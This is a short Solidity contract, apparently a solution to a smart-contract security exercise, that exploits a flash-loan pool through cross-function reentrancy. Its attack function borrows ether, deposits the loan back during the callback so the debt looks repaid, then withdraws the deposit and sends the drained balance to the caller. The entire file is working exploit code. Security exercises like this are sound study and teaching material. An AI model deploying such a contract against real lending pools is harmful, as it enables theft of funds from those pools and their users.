// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Reenter/Reenter.sol";

contract ReenterPoolExploit {
    ReenterPool pool;

    constructor (address _pool) {
        pool = ReenterPool(_pool);
    }
    // leveraging cross-function reentrancy in victim's contract
    function attack(uint256 _amount) public {
        pool.flashLoan(_amount);
        pool.withdraw();

        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed");
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable{}
}

